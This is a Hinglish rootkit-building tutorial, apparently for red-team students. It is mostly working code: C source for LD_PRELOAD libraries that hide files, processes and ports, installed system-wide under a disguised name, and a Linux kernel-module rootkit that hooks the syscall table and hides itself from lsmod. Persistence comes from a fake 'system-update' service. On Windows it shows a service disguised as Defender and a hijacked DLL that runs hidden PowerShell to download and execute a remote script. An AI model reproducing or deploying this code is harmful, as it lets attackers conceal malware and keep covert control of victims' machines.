Rootkit — Complete Concept

Foundation

Rootkit ek malware hai jo system ke andar itna deep chhup jaata hai ki security tools, antivirus, aur administrators bhi detect nahi kar paate. Ye apne aap ko aur apne saathi malware ko chhupaata hai.

Rootkit ka core idea: OS ke tools ko hi corrupt karna taaki woh tools apna kaam sahi se na kar sakein. Jaise chaukidar ko hi bribe kar do.
Type 01 — LD_PRELOAD Rootkit

LD_PRELOAD Rootkit — Linux

Userspace

Linux mein jab koi program run hota hai, pehle LD_PRELOAD environment variable ki library load hoti hai. Iska fayda uthake original system functions ko apne custom (malicious) version se replace kar sakte hain.

ConceptKaise kaam karta hai
NormalRootkit ke saath
ps command → libc readdir() → kernel → resultps command → rootkit.so readdir() → filter karo → saaf result
ls command → genuine file listls command → rootkit.so → malicious files filtered out
netstat → real connectionsnetstat → rootkit.so → attacker connection hidden
CodeBasic LD_PRELOAD Rootkit Template (C)
/* rootkit.c — base template */
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

/* Jo cheez chhupani hai uska naam ya string */
#define HIDE_STRING "rootkit_process"
#define HIDE_FILE   ".hidden_file"
#define HIDE_PORT   "31337"

/* readdir() hook — ls aur ps ke liye */
struct dirent *readdir(DIR *dirp) {
    struct dirent *(*orig)(DIR *) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *ep;

    while ((ep = orig(dirp)) != NULL) {
        /* Agar entry mein hide string hai to skip karo */
        if (strstr(ep->d_name, HIDE_STRING) == NULL &&
            strstr(ep->d_name, HIDE_FILE) == NULL) {
            return ep;  /* Normal entry — return karo */
        }
        /* Hidden entry — skip aur agli entry dhundho */
    }
    return NULL;
}
CompileShared library banao aur load karo
# Compile karo shared library ke roop mein:
gcc -shared -fPIC -o /lib/librootkit.so rootkit.c -ldl

# Method 1 — current session ke liye:
export LD_PRELOAD=/lib/librootkit.so

# Method 2 — system-wide permanent (root chahiye):
echo "/lib/librootkit.so" >> /etc/ld.so.preload
# Ab EVERY program is rootkit library ko load karega

# Verify karo kaam kar raha hai:
ls -la | grep hidden_file  # Nahi dikhega

Process Hide karna (LD_PRELOAD)

Process Hiding

ps, top, htop commands /proc directory ko read karte hain — readdir() hook se malicious process wali entries filter kar do.

CodeProcess Hide — PID ya name se
/* process_hide.c */
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>

/* Hide karne wali process ka naam */
#define HIDE_PROC "backdoor"
#define HIDE_PID  "1337"

struct dirent *readdir(DIR *dirp) {
    struct dirent *(*orig)(DIR *) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *ep;

    while ((ep = orig(dirp)) != NULL) {
        /* /proc mein numeric dirs = PIDs */
        if (atoi(ep->d_name) != 0) {
            char path[256];
            snprintf(path, sizeof(path), "/proc/%s/cmdline", ep->d_name);
            FILE *f = fopen(path, "r");
            if (f) {
                char cmdline[256] = {0};
                fread(cmdline, 1, sizeof(cmdline)-1, f);
                fclose(f);
                /* Agar process naam match kare — hide karo */
                if (strstr(cmdline, HIDE_PROC) != NULL) {
                    continue;  /* Skip — next entry lo */
                }
            }
        }
        /* PID number se bhi hide kar sakte hain */
        if (strcmp(ep->d_name, HIDE_PID) == 0) {
            continue;
        }
        return ep;
    }
    return NULL;
}

/* Compile: */
/* gcc -shared -fPIC -o process_hide.so process_hide.c -ldl */
/* echo "/path/process_hide.so" >> /etc/ld.so.preload */

Network Connection Hide karna

Network Hiding

netstat aur ss commands /proc/net/tcp file padhte hain — fopen() hook se attacker ka port filter kar do.

CodeNetwork port hide — fopen() hook
/* net_hide.c — attacker ka port netstat se hide karo */
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <stdlib.h>

/* Port in hex (4444 = 115C) */
#define HIDE_PORT "115C"

FILE *fopen(const char *pathname, const char *mode) {
    FILE *(*orig)(const char *, const char *) = dlsym(RTLD_NEXT, "fopen");
    FILE *f = orig(pathname, mode);

    /* /proc/net/tcp ya /proc/net/tcp6 read ho rahi hai */
    if (strstr(pathname, "/proc/net/tcp") != NULL && f != NULL) {
        FILE *tmp = tmpfile();
        char line[512];
        while (fgets(line, sizeof(line), f)) {
            /* Line mein hidden port hai? Skip karo */
            if (strstr(line, HIDE_PORT) == NULL) {
                fputs(line, tmp);
            }
        }
        fclose(f);
        rewind(tmp);
        return tmp;
    }
    return f;
}

/* Compile: */
/* gcc -shared -fPIC -o net_hide.so net_hide.c -ldl */

File Hide karna

File Hiding
Codels se specific files ya directories hide karo
/* file_hide.c */
#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>

/* Ye strings wali files/dirs hide ho jaayengi */
static const char *hide_list[] = {
    ".rootkit",
    "backdoor",
    "keylogger",
    "librootkit.so",
    NULL
};

struct dirent *readdir(DIR *dirp) {
    struct dirent *(*orig)(DIR *) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *ep;

    while ((ep = orig(dirp)) != NULL) {
        int hide = 0;
        for (int i = 0; hide_list[i] != NULL; i++) {
            if (strstr(ep->d_name, hide_list[i]) != NULL) {
                hide = 1;
                break;
            }
        }
        if (!hide) return ep;
    }
    return NULL;
}

/* stat() bhi hook karo taaki file exist check bhi fail ho: */
#include <sys/stat.h>
#include <errno.h>

int stat(const char *pathname, struct stat *statbuf) {
    int (*orig)(const char *, struct stat *) = dlsym(RTLD_NEXT, "stat");
    for (int i = 0; hide_list[i] != NULL; i++) {
        if (strstr(pathname, hide_list[i]) != NULL) {
            errno = ENOENT;  /* "File not found" error return karo */
            return -1;
        }
    }
    return orig(pathname, statbuf);
}
CombinedSab kuch ek file mein compile karke install karo
# Compile all-in-one rootkit:
gcc -shared -fPIC -o /lib/x86_64-linux-gnu/libaudit.so.0.bak rootkit_complete.c -ldl

# /etc/ld.so.preload mein add karo:
echo "/lib/x86_64-linux-gnu/libaudit.so.0.bak" > /etc/ld.so.preload

# Test karo:
ls /         # rootkit related files nahi dikhenge
ps aux       # backdoor process nahi dikhegi
netstat -an  # attacker connection nahi dikhega
LD_PRELOAD rootkit ka weakness: cat /etc/ld.so.preload check karne se detect ho jaata hai. Kernel module rootkit ye bhi hide kar leta hai.

Kernel Module (LKM) Rootkit — Linux

Kernel Level

Kernel module (LKM) seedha kernel ke andar load hota hai — LD_PRELOAD rootkit se zyada powerful kyunki ye kernel ke system calls directly hook karta hai. LD_PRELOAD bhi detect nahi kar paata isse.

ConceptLKM Rootkit kaise kaam karta hai
ComponentFunction
sys_call_tableKernel ka system call table — hooks yahin lagaate hain
getdents64()Directory entries return karta hai — hook karke files hide karo
kill()Signal send karta hai — hook karke magic signal se rootkit control karo
Module hidelsmod se apna module bhi hide kar lo
CodeBasic LKM Rootkit (Linux Kernel Module)
/* lkm_rootkit.c — Basic Linux Kernel Module Rootkit */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Red Team");
MODULE_DESCRIPTION("LKM Rootkit PoC");

#define HIDE_FILE "rootkit"
#define MAGIC_SIG 31337  /* Magic signal — rootkit control ke liye */

/* Original syscall pointers */
static unsigned long *sys_call_table;
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);

/* Write protection disable/enable */
static void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    write_cr0(cr0);
}

static void enable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
}

/* Hooked getdents64 — files hide karne ke liye */
asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    long ret = orig_getdents64(regs);
    /* Result se HIDE_FILE wali entries filter karo */
    /* (full implementation userspace copy ke saath) */
    return ret;
}

/* Hooked kill — magic signal se rootkit control */
asmlinkage long hooked_kill(const struct pt_regs *regs) {
    int sig = regs->si;
    if (sig == MAGIC_SIG) {
        /* Magic signal aaya — module ko lsmod se hide/unhide karo */
        return 0;
    }
    return orig_kill(regs);
}

/* Module load hone pe */
static int __init rootkit_init(void) {
    printk(KERN_INFO "System update applied\n");  /* Innocent log */

    /* sys_call_table address dhundho */
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    /* Hooks lagao */
    disable_write_protection();
    orig_getdents64 = (void *)sys_call_table[__NR_getdents64];
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    orig_kill = (void *)sys_call_table[__NR_kill];
    sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
    enable_write_protection();

    /* Module ko lsmod se hide karo */
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    return 0;
}

static void __exit rootkit_exit(void) {
    /* Hooks hatao */
    disable_write_protection();
    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    enable_write_protection();
}

module_init(rootkit_init);
module_exit(rootkit_exit);

# Makefile:
obj-m += lkm_rootkit.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

# Build karo:
make

# Load karo (root chahiye):
insmod lkm_rootkit.ko

# Verify — lsmod mein nahi dikhega (hide hai):
lsmod | grep rootkit  # Nothing

# Unload karo (agar needed):
rmmod lkm_rootkit
PersistenceBoot pe auto-load karo
# /etc/modules mein add karo:
echo "lkm_rootkit" >> /etc/modules

# Ya systemd service banao:
cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Service

[Service]
Type=oneshot
ExecStart=/sbin/insmod /lib/modules/$(uname -r)/kernel/lkm_rootkit.ko
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

systemctl enable system-update.service
LKM rootkit ke liye kernel headers aur root access chahiye. Modern kernels mein Secure Boot aur kernel module signing bypass karna advanced hai — OSCP ke baad Red Team deep-dive mein cover karenge.

Windows Registry + Service Rootkit

Windows

Windows mein registry keys, services aur drivers manipulate karke malware chhupaya jaata hai.

Method 1Hidden Registry Key banao
# Registry key mein null character se hide karo:
# Normal tools null character ke baad wala string nahi dekhte
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe\0hidden" /v Debugger /t REG_SZ /d "C:\malware.exe"

# PowerShell se hidden subkey banao:
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
$hiddenKey = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
    [Microsoft.Win32.RegistryHive]::LocalMachine,
    [Microsoft.Win32.RegistryView]::Registry64
)
# Null byte key name — regedit mein visible nahi hogi
Method 2Malicious Service — legitimate naam se chhupao
# Service banao jo Windows system service jaisi lage:
sc create "WinDefend32" binpath= "C:\Windows\Temp\malware.exe" start= auto
sc description "WinDefend32" "Windows Defender Real-time Protection Service"

# Service start karo:
sc start WinDefend32

# Registry mein service entry hide karo (ImagePath change):
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend32" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\System32\svchost.exe -k netsvcs" /f
# Actual malware alag jagah se load hoga — service entry clean dikhegi
Method 3DLL Hijacking — Legitimate process ke through load
# Ek legitimate application ka DLL search order abuse karo:
# Windows DLL load order: Current dir → System32 → etc.

# 1. Find vulnerable app (procmon se DLL not found check karo)
# 2. Malicious DLL banao same naam se:

/* malicious_dll.c */
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Payload execute karo
        WinExec("powershell -nop -w hidden -c IEX(IWR 'http://IP/shell.ps1')", SW_HIDE);
    }
    return TRUE;
}

# Compile: 
# x86_64-w64-mingw32-gcc -shared -o target_dll.dll malicious_dll.c
# DLL ko vulnerable app ke folder mein rakho

Bootkit — Concept & Overview

Expert Level

Bootkit MBR (Master Boot Record) ya UEFI firmware mein chhup jaata hai — OS load hone se PEHLE execute hota hai. OS reinstall se bhi nahi jaata (UEFI version).

TypeTargetKya karta hai
MBR BootkitDisk ka first sector (MBR)OS bootloader se pehle apna code run karta hai, OS ko modify kar ke load karta hai
VBR BootkitVolume Boot RecordPartition level pe infection
UEFI BootkitUEFI firmware (motherboard)Disk format, OS reinstall ke baad bhi rehta hai
FamousReal-world Bootkit Examples (study ke liye)
NameTypeNotable
BlackLotusUEFI2023 — Secure Boot bypass karta hai, modern Windows pe bhi kaam karta hai
CosmicStrandUEFINation-state level — firmware mein permanently embedded
TDL4 (Alureon)MBRClassic bootkit — 64-bit Windows mein bhi kaam karta tha
NecursMBRAntivirus disable karta tha before OS load
ConceptMBR Overwrite — Basic Idea
# MBR backup le lo (test lab mein):
dd if=/dev/sda of=mbr_backup.bin bs=512 count=1

# MBR read karo:
xxd /dev/sda | head -32
# First 446 bytes = bootloader code
# 446-510 = partition table
# 510-512 = boot signature (0x55AA)

# MBR restore karo (agar needed):
dd if=mbr_backup.bin of=/dev/sda bs=512 count=1
# CAUTION: SIRF authorized lab VMs mein
Bootkit development expert-level skill hai — assembly, OS boot process, UEFI internals sab samajhna padta hai. Red Team mein practically bootkit likhne ki zaroorat bahut kam hoti hai — existing tools study karna zyada useful hai. Ye section sirf concept ke liye hai.

Stealth
TrickKaise

Sabse important anti-detection trick: minimum footprint — sirf wo karo jo zaroorat hai. Zyada hooking = zyada chance of detection. Simple backdoor + basic hiding often beats complex rootkit jo bugs se detect ho jaata hai.
